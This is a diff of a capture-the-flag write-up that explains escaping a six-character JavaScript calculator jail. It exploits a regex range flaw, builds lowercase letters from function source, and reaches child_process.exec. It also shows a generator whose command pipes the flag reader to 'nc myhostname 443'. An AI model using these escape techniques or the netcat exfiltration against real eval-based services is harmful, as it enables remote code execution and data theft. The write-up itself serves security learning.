@@ -9,34 +9,34 @@ Solves: 2 / Points: 200 / Category: Jail
 ## Challenge description 
 I've made a simple calculator in JS, I know I shouldn't use eval but with only 6 chars per line I should be safe.
 
-Note: the [source code](/assets/calc.js) of the challenge was accessible
+Note: the [source code](/assets/calc.js) of the challenge was provided
 
 ## Challenge resolution
 Our objective is to execute a shell command from the JS calculator.
-To perform that we have to run the following payload on the calculator :
+To perform that, we have to run the following payload on the calculator:
 
 ```javascript
 require('child_process').exec("cmd")
 ```
 
 
-### Step one : bypass 6 chars limitation
+### Step one: bypass 6 chars limitation
 
-The calc limits input size to 6 chars :
+The calc limits input size to 6 chars:
 ```js
 createFilter(line => line.length < 7, "Input too long, max 6 char per line."), // check line length
 ```
 
-Problem : Simple and good control -> no bypass :(
+Problem: Simple and good control -> no bypass :(
 
-Solution : 
+Solution: 
 
 The calc program uses the regexp  "^([0123456789*\/+%-_ 	])+$" to validate inputs.
 
 The interesting point here is the position of the operator "-" which define an interval on a RegExp context when it's not escaped.
 Thus, all the characters between the "%" and "_",   A to Z included but not a to z.
 
-So we can create a variable an store data :
+So we can create a variable and store data:
 ```js
 > A='E'
 E
@@ -48,9 +48,9 @@ Therefore, we are able to build a payload of more than 6 characters.
 
 Unfortunately JavaScript is a case-sensitive language, so we can not write our exploit directly.
 
-### Step two : Lowercase alphabet construction
+### Step two: Lowercase alphabet construction
 
-From JavaScript doc :
+From JavaScript doc:
 > \+ is also used as the string concatenation operator: If any of its arguments is a string or is otherwise not a number, any non-string arguments are converted to strings, and the 2 strings are concatenated.
 
 In the provided script, we have a fully upercase function name: `EVAL`
@@ -74,7 +74,7 @@ s
 
 However, the content of the above response doesn't allow us to write the desired payload. We need to retrieve more chars.
 
-We tried with the main function :
+We tried with the main function:
 ```javascript
 A=EVAL
 A+1
@@ -95,7 +95,7 @@ E=_
 A(E) // EVAL("main")
 _+1  // show main's code
 ```
-Output : 
+Output: 
 ```javascript
 function main(){
     console.log("   _________________________________   ")
@@ -108,9 +108,9 @@ function main(){
 ```
 Nice, we have more chars here !
 
-### Step two(bis) : Lowercase alphabet py-construction
+### Step two(bis): Lowercase alphabet py-construction
 To write the complete payload we had to automate the steps above.
-The following python  script is the result of the automation process :
+The following python  script is the result of the automation process:
 ```python
 # EVAL source code
 a = """function (src){
@@ -322,7 +322,7 @@ def getQ():
 
 The getQ function generates the instructions to obtain the letter "q" because there are no "q" on main or EVAL code.
 
-Finally, we wrote the generation of the payload :
+Finally, we wrote the generation of the payload:
 
 ```python
 # payload generation
@@ -351,7 +351,7 @@ print "E=''"
 generate("/home/guest/flag_reader | nc myhostname 443", a, "A", b, "M")
 ```
 
-Once the output of the python generator executed on the JS calculator we had the following vars :
+Once the output of the python generator executed on the JS calculator, we had the following vars :
 
 ```js
 > F
@@ -365,10 +365,9 @@ Run the exec function F with the parameter E and get the flag :
 > F(E)
 ```
 
-```sh
+```terminal
 root@myhostname# nc -lp 443
 
 breizhctf_flag{FORGOTTEN_FLAG}
 
 ```
-
